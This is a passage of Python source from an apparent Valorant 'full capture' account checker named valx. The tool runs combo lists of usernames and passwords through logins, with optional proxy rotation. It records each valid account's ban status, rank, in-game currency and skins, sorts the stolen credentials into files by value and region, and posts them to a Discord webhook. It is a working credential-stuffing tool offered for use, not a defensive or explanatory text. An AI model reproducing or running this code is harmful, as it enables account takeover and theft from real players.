            skin = response.split(skinid)[1].split(',')[1].replace('"displayName":"','').replace('\\"','').replace('"','').replace('u00A0','').replace("'",'')
            if skin in SkinStr or skin in SkinStr2:
                pass
            else:
                if "Level" in skin:
                    userChromas.append(skin)
                else:
                    userSkins.append(skin)
        userChromas.sort(key=str.lower)
        userSkins.sort(key=str.lower)
        for skn in userSkins:
            SkinNumber = userSkins.index(skn) + 1
            SkinStr += skn + ", "
            SkinStr2 += f"╠═╡{SkinNumber}╞═› " + skn + "\n"
        for chrr in userChromas:
            ChromasNumber = userChromas.index(chrr) + 1
            ChromasStr += chrr + ", "
            ChromasStr2 += f"╠═╡{ChromasNumber}╞═› " + chrr + "\n"
        skin_amount = len(userSkins)
        skin_amount = int(skin_amount)
        bannedtxt12 = open(f"results/{current_date}/fullcapture.txt", "a+", encoding="utf-8")
        logtext9 = open(f"results/{current_date}/log_fullcapture.txt", "a+", encoding="utf-8")
        no_capturetext = open(f"results/{current_date}/no_capture.txt", "a+", encoding="utf-8")
        if skin_amount == 0:
            tskin = "unskinned"
            category = "no_skins"
            no_skins += 1
            good += 1
        elif skin_amount in range(1, 10):
            tskin = "skinned"
            category = "1-10"
            _1_9 += 1
            skinned += 1
            good += 1
        elif skin_amount in range(10, 20):
            tskin = "skinned"
            category = "10-20"
            _10_19 += 1
            skinned += 1
            good += 1
        elif skin_amount in range(20, 30):
            tskin = "skinned"
            category = "20-30"
            _20_29 += 1
            skinned += 1
            good += 1
        elif skin_amount in range(30, 40):
            tskin = "skinned"
            category = "30-40"
            _30_39 += 1
            skinned += 1
            good += 1
        elif skin_amount in range(40, 50):
            tskin = "skinned"
            category = "40-50"
            _40_49 += 1
            skinned += 1
            good += 1
        elif skin_amount in range(50, 100):
            tskin = "skinned"
            category = "50-100"
            _50_99 += 1
            skinned += 1
            good += 1
        elif skin_amount in range(100, 150):
            tskin = "skinned"
            category = "100-150"
            _100_150 += 1
            skinned += 1
            good += 1
        elif skin_amount in range(150,1000):
            tskin = "skinned"
            category = "150+"
            _151 += 1
            skinned += 1
            good += 1
        else:
            failed_accounts.append(combos)
            retries += 1
        if typebanned == None or typebanned == "PBE_LOGIN_TIME_BAN" or typebanned == "LEGACY_BAN":
            if EmailVerified == "true":
                verified += 1
            else:
                unverified += 1
            typebanned = "Unbanned"
            if regg == "br2":
                Region = "br"
            elif regg == "la2":
                Region = "latam"
            bregiontext123 = open(f"results/{current_date}/region/{Region}/{tskin}.txt", "a+", encoding="utf-8").write(f"{username}:{password}\n")
            lreveltexet123 = open(f"results/{current_date}/level/{levelc}/{tskin}.txt", "a+", encoding="utf-8").write(f"{username}:{password}\n")
            skincategory = open(f"results/{current_date}/{tskin}/{category}_no_capture.txt", "a+", encoding="utf-8").write(f"{username}:{password}\n")

            skincategory = open(f"results/{current_date}/{tskin}/{category}_fullcapture.txt", "a+", encoding="utf-8").write(f"╔════════════════╣valx╠════════════════╗\n╠═ User&Pass: {username}:{password}\n╠═ Banntype: {typebanned}\n╠═ Last Game: {last_time}\n╠═ Region: {Region}\n╠═ Level: {AccountLevel}\n╠═ Email Verified: {EmailVerified}\n╠═ Creation: {result_s}\n╠═ Rank: {Rank}\n╠═ VP: {ValorantPoints} - RP: {Radianite}\n╠════════╣Skins({len(userSkins)})╠═════════╣\n{SkinStr2}╠═══════╣Chromas({len(userChromas)})╠════════╣\n{ChromasStr2}╚════════════════════════════════════════════╝\n\n")
            #region cap
            bansnedtxt1213 = open(f"results/{current_date}/{tskin}/region/{Region}.txt", "a+", encoding="utf-8").write(f"{username}:{password} | Banntype: {typebanned} | Last Game: {last_time} | Region: {Region} | Level: {AccountLevel} | Email Verified: {EmailVerified} | Creation: {result_s} | Rank: {Rank} | VP: {ValorantPoints} - RP: {Radianite} | Skins({len(userSkins)}) : {SkinStr}\n")
            logtxet83 = open(f"results/{current_date}/log/region/{Region}.txt", "a+", encoding="utf-8").write(f"╔════════════════╣valx╠════════════════╗\n╠═ User&Pass: {username}:{password}\n╠═ Banntype: {typebanned}\n╠═ Last Game: {last_time}\n╠═ Region: {Region}\n╠═ Level: {AccountLevel}\n╠═ Email Verified: {EmailVerified}\n╠═ Creation: {result_s}\n╠═ Rank: {Rank}\n╠═ VP: {ValorantPoints} - RP: {Radianite}\n╠════════╣Skins({len(userSkins)})╠═════════╣\n{SkinStr2}╠═══════╣Chromas({len(userChromas)})╠════════╣\n{ChromasStr2}╚════════════════════════════════════════════╝\n\n")
            #level cap
            bannedtxt121 = open(f"results/{current_date}/{tskin}/level/{levelc}.txt", "a+", encoding="utf-8")
            bannedtxt121.write(f"{username}:{password} | Banntype: {typebanned} | Last Game: {last_time} | Region: {Region} | Level: {AccountLevel} | Email Verified: {EmailVerified} | Creation: {result_s} | Rank: {Rank} | VP: {ValorantPoints} - RP: {Radianite} | Skins({len(userSkins)}) : {SkinStr}\n")
            bannedtxt121.close()
            logtxet8 = open(f"results/{current_date}/log/level/{levelc}.txt", "a+", encoding="utf-8")
            logtxet8.write(f"╔════════════════╣valx╠════════════════╗\n╠═ User&Pass: {username}:{password}\n╠═ Banntype: {typebanned}\n╠═ Last Game: {last_time}\n╠═ Region: {Region}\n╠═ Level: {AccountLevel}\n╠═ Email Verified: {EmailVerified}\n╠═ Creation: {result_s}\n╠═ Rank: {Rank}\n╠═ VP: {ValorantPoints} - RP: {Radianite}\n╠════════╣Skins({len(userSkins)})╠═════════╣\n{SkinStr2}╠═══════╣Chromas({len(userChromas)})╠════════╣\n{ChromasStr2}╚════════════════════════════════════════════╝\n\n")
            logtxet8.close()
            #else
            bannedtxt12.write(f"{username}:{password} | Banntype: {typebanned} | Last Game: {last_time} | Region: {Region} | Level: {AccountLevel} | Email Verified: {EmailVerified} | Creation: {result_s} | Rank: {Rank} | VP: {ValorantPoints} - RP: {Radianite} | Skins({len(userSkins)}) : {SkinStr}\n")
            bannedtxt12.close()
            if tskin == "unskinned":
                logtext9.write(f"╔════════════════╣valx╠════════════════╗\n╠═ User&Pass: {username}:{password}\n╠═ Banntype: {typebanned}\n╠═ Last Game: {last_time}\n╠═ Region: {Region}\n╠═ Level: {AccountLevel}\n╠═ Email Verified: {EmailVerified}\n╠═ Creation: {result_s}\n╠═ Rank: {Rank}\n╠═ VP: {ValorantPoints} - RP: {Radianite}\n╚════════════════════════════════════════════╝\n\n")
                logtext9.close()
            elif tskin == "skinned":
                logtext9.write(f"╔════════════════╣valx╠════════════════╗\n╠═ User&Pass: {username}:{password}\n╠═ Banntype: {typebanned}\n╠═ Last Game: {last_time}\n╠═ Region: {Region}\n╠═ Level: {AccountLevel}\n╠═ Email Verified: {EmailVerified}\n╠═ Creation: {result_s}\n╠═ Rank: {Rank}\n╠═ VP: {ValorantPoints} - RP: {Radianite}\n╠════════╣Skins({len(userSkins)})╠═════════╣\n{SkinStr2}╠═══════╣Chromas({len(userChromas)})╠════════╣\n{ChromasStr2}╚════════════════════════════════════════════╝\n\n")
                logtext9.close()
            no_capturetext.write(f"{username}:{password}\n")
            no_capturetext.close()
            if config_data['webhook'] != "":
                if s_sts == True:
                    dwec = False
                else:
                    dwec = True

                if skin_amount == 0 and dsk == False:
                    dwec = False

                if "Reaver Karambit" in SkinStr and dws == False:
                    dwec = False

                if dwec == True:
                    try:
                        dcwebhook = DiscordWebhook(url=webhook)
                        embed = DiscordEmbed(title='New valid account', color='34eb43')
                        embed.set_author(name='valx')
                        embed.set_timestamp()
                        embed.add_embed_field(name='Account', value=f"{username}:{password}")
                        embed.add_embed_field(name='Region', value=Region)
                        embed.add_embed_field(name='Rank', value=Rank)
                        embed.add_embed_field(name='Level', value=AccountLevel)
                        embed.add_embed_field(name='Lastmatch', value=last_time)
                        embed.add_embed_field(name='Email Verified', value=EmailVerified)
                        embed.add_embed_field(name=f'VP / RP', value=f'{ValorantPoints} / {Radianite}')
                        embed.add_embed_field(name=f'Skins ({len(userSkins)})',value=SkinStr if SkinStr.replace(' ','').replace('\n','')!='' else 'black moneky')
                        dcwebhook.add_embed(embed)
                        response = dcwebhook.execute()
                    except Exception as e:
                        traceback.print_exc()
                        return
                else:
                    pass
            if oneline == True:
                print(f"\n` user&pass > {username}:{password}\n` GameName > {GameName}\n` Last Game > {last_time}\n` Region > {Region.upper()}\n` Level > {AccountLevel}\n` Email Verifed : {EmailVerified}\n` Creation Date > {result_s}\n` Rank > {Rank}\n` Balance | VP > {ValorantPoints} - RP > {Radianite}\n` Skins/Chromas Amount > {len(userSkins)} - {len(userChromas)}\n\n` Skins > {SkinStr}\n\n` Chromas > {ChromasStr}")
                input()
    except Exception as e:
        traceback.print_exc()
        input(f"\n THIS IS A ERROR IF U GET THIS SENT IT TO {mov}Zruxr{reset} OR ON HIS SERVER, {red}LOVE <3{reset} | {combo}")
        time.sleep(3)
        errors += 1


def print_info():
    global s_sts
    if config_data['webhook'] != "":
        time.sleep(5)
        dcwebhook = DiscordWebhook(url=webhook)
        embed = DiscordEmbed(title='Stats', color='686d75')
        embed.set_author(name='valx')
        embed.set_timestamp()
        embed.add_embed_field(name='Checked', value=f'{checked}/{len(combos)}')
        embed.add_embed_field(name='Valid', value=good)
        embed.add_embed_field(name='Banned', value=perban)
        embed.add_embed_field(name='TempBanned', value=timeban)
        embed.add_embed_field(name='RLimits', value=ratelimit)
        embed.add_embed_field(name='With Skins', value=skinned)
        embed.add_embed_field(name='Unverifiedmail', value=unverified)
        dcwebhook.add_embed(embed)
        response=dcwebhook.execute()


def start_checking(combos, failed_accounts):
    global proxyless
    try:
        if dur == True:
                threading.Thread(target=print_info, args=()).start()
        def check(accounts):
            global proxy_counter, dur, s_sts
            screen()
            if proxyless:
                checker(account)
            else:
                proxy = proxies[proxy_counter]
                checker(account, proxy)
                proxy_counter += 1
                if len(proxies) <= proxy_counter:
                    proxy_counter = 0
        for account in combos:
            check(account)
        proxy_counter = 0
        while True:
            if not len(failed_accounts):
                break
            for account in failed_accounts:
                check(account)
                failed_accounts.remove(account)
    except Exception as e:
        traceback.print_exc()
        input()

def credits():
    os.system("cls")
    print(title)
    print("    1 ~ Discord \n    2 ~ YouTube \n    3 ~ Github \n\n    q ~ Go Back \n")
    c = input("      ~ ")
    if c == "1":
        os.system("cls")
        print(title)
        print("  dm us at zruxr. on discord\n")
        e = input(f"    ~ Press {Back.WHITE}{Fore.BLACK}ENTER{Back.RESET}{reset} if u want to join or {Back.WHITE}{Fore.BLACK}X{Back.RESET}{reset} to go back\n    ~ ")
        if e == "x":
            credits()
        else:
            webbrowser.open("https://discord.gg/SxE38CgWxy")
    elif c == "2":
        webbrowser.open("https://www.youtube.com/channel/UCAoESL4du7KuDSD5V02zZAg")
        credits()
    elif c == "3":
        print("\n       ~ https://github.com/zroooxr/Valx-Valorant-Checker-full-capture-")
        time.sleep(4)
        credits()
    elif c == "q":
        main()
    else:
        close()


def close():
    os.system("cls")
    print(title)
    e = input(f" {red}~{reset} Are u sure u want to exit( y {red}/{reset} n ) ")
    if e == "y":
        sys.exit()
    elif e == "n":
        main()
    else:
        close()

def dwebsett():
    global dsk, dur, dws, s_sts
    os.system("cls")
    print(title)
    print(f"    1 {red}~{reset} Send unskinned accounts : {dsk} \n    2 {red}~{reset} Sends stats (once per 3.3 min) : {dur} \n    3 {red}~{reset} Send accounts with only wayfinder shorty : {dws}\n    4 {red}~{reset} Send only stats : {s_sts}\n\n    q {red}~{reset} Go Back \n")
    c = repr(readchar.readkey())
    if c == "'1'":
        if dsk == False:
            dsk = True
        else:
            dsk = False
        dwebsett()
    elif c == "'2'":
        if dur == False:
            dur = True
        else:
            dur = False
        dwebsett()
    elif c == "'3'":
        if dws == False:
            dws = True
        else:
            dws = False
        dwebsett()
    elif c == "'4'":
        if s_sts == False:
            s_sts = True
            dws = False
            dur = False
            dsk = False
        else:
            s_sts = False
            dws = False
            dur = False
            dsk = False
        dwebsett()
    elif c == "'q'":
        config_data['SEND_UNSKINNED'] = dsk
        config_data['SEND_STATS'] = dur
        config_data['SEND_WITH_THAT_SKIN'] = dws
        config_data['SEND_ONLY_STATS'] = s_sts
        with open("config.json", "w") as jsonFile:
            json.dump(config_data, jsonFile)
        main()
    else:
        dwebsett()


def sett1():
    os.system("cls")
    print(title)
    v = input(f"      {red}~{reset} Use Webhook ?\n   1) yes {red}~{reset} 2) no  ~ ")
    if v == "1":
        os.system("cls")
        print(title)
    else:
        config_data['webhook'] = ""
        with open("config.json", "w") as jsonFile:
            json.dump(config_data, jsonFile)
        main()
    print(f"    1 {red}~{reset} Webhook link \n    2 {red}~{reset} Webhook settings \n\n    q {red}~{reset} Go Back \n")
    c = input("      ~ ")
    if c == "1":
        os.system("cls")
        print(title)
        def dwc():
            global dsk, dws, dur
            os.system("cls")
            print(title)
            u = input(f"      {red}~{reset} Discord Webhook Link : ")
            config_data['webhook'] = u
            with open("config.json", "w") as jsonFile:
                json.dump(config_data, jsonFile)
            main()
        if config_data['webhook'] != "":
            c = input(f"    {red}~{reset} You want to change webhook ? {red}|{reset} current webhook \n" + str(webhook) + f"\n   1) yes {red}~{reset} 2) no  ~ ")
            if c == "1":
                dwc()
            elif c == "2":
                main()
        else:
            print(f"    {red}~{reset} No webhook found")
            time.sleep(2)
            dwc()
    elif c == "2":
        dwebsett()
    elif c == "3":
        print(f"\n       {red}~{reset} soon")
        time.sleep(4)
        credits()
    elif c == "q":
        main()
    else:
        sett1()

def main():
    global proxyless, oneline
    os.system('mode con: cols=85 lines=22')
    os.system("cls")
    print(title)
    print(f"    1 {red}~{reset} Checker \n    2 {red}~{reset} One line checker \n    3 {red}~{reset} Credits \n    4 {red}~{reset} Settings \n\n    x {red}~{reset} EXIT\n")
    c = repr(readchar.readkey()) 
    if c == "'1'":
        def chk():
            global proxyless
            os.system("cls")
            print(title)
            print(f"\n[{red}!{reset}] Options below are single threaded, check out valx for more options \n\n 1 {red}~{reset} Proxyless \n 2 {red}~{reset} Proxy (Supports up to 1 proxy) \n")
            c = repr(readchar.readkey()) 
            if c == "'1'":
                proxyless = True
            elif c == "'2'":
                print("")
            else:
                chk()
            getcombos()
            if not proxyless:
                getproxies()
            os.system('mode con: cols=145 lines=35')
            start_checking(combos, failed_accounts)
        chk()
        screen()
        input("Done Checking  ! PRESS ENTER TO CLOSE")
    elif c == "'2'":
        os.system('mode con: cols=100 lines=40')
        os.system("cls")
        print(title)
        account= input(" ~ Valorant Account (user:pass) : ")
        combos.append(account)
        proxyless = True
        oneline = True
        checker(account)
    elif c == "'3'":
        credits()
    elif c == "'4'":
        sett1()
    elif c == "'x'":
        close()
    else:
        main()

main()
